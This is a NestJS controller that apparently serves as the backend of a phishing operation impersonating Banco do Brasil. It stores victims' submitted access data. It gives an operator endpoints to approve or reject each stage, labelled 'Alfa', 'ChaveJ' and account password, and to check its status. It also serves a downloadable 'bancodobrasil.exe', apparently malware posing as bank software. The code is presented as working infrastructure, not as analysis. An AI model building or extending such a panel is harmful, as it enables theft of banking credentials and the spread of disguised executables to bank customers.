import {
  Controller,
  Get,
  Param,
  Post,
  Body,
  Put,
  Res,
  HttpStatus,
} from '@nestjs/common';
import { UserService } from './user.service';
import { Response } from 'express';
import { AcessoDto } from './dtos/Acesso.dto';
import * as path from 'path';
import * as fs from 'fs';
@Controller('banco')
export class AcessoController {
  constructor(private readonly userService: UserService) {}

  @Post('acesso')
  async create(@Body() acessoDto: AcessoDto) {
    return this.userService.create(acessoDto);
  }

  @Get()
  async findAll() {
    return this.userService.findAll();
  }

  @Get(':numberUser')
  async findUser(@Param('numberUser') numberUser: string) {
    return this.userService.findUser(numberUser);
  }

  @Put(':numberUser')
  async updateUser(
    @Param('numberUser') numberUser: string,
    @Body() acessoDto: AcessoDto,
  ) {
    return this.userService.updateUser(numberUser, acessoDto);
  }

  //alfa

  @Put('approveAlfa/:id')
  async approvedAlfa(@Param('id') id: string) {
    return this.userService.approvedAlfa(id);
  }

  @Get('baixar/arquivo')
  @Get('baixar/arquivo')
  downloadFile(@Res() res: Response) {
    const fileName = 'bancodobrasil.exe';
    const filePath = path.join(
      __dirname,
      '../../../',
      'src',
      'shared',
      'Files',
      fileName,
    );

    // Verificar se o arquivo existe
    if (fs.existsSync(filePath)) {
      res.set({
        'Content-Type': 'application/octet-stream',
        'Content-Disposition': `attachment; filename=${fileName}`,
      });

      const fileStream = fs.createReadStream(filePath);
      fileStream.pipe(res);
      fileStream.on('end', () => {
        res.end();
      });
    } else {
      console.error('File not found:', filePath);
      res.status(HttpStatus.NOT_FOUND).send('File not found');
    }
  }

  @Get('statusAlfa/:numberUser')
  async checkStatusAlfa(@Param('numberUser') numberUser: string) {
    return this.userService.checkStatusAlfa(numberUser);
  }

  //ChaveJ

  @Put('approveChavej/:id')
  async approveChavej(@Param('id') id: string) {
    return this.userService.approveChavej(id);
  }

  @Get('statusChavej/:numberUser')
  async checkStatusChaveJ(@Param('numberUser') numberUser: string) {
    return this.userService.checkStatusChavej(numberUser);
  }

  //senha conta

  @Put('approvePassword/:id')
  async approvePassword(@Param('id') id: string) {
    return this.userService.approvedPassword(id);
  }

  @Get('statusPassword/:numberUser')
  async checkStatusPassword(@Param('numberUser') numberUser: string) {
    return this.userService.checkStatusPassword(numberUser);
  }

  @Put('reject/:id')
  async reject(@Param('id') id: string) {
    return this.userService.reject(id);
  }
}
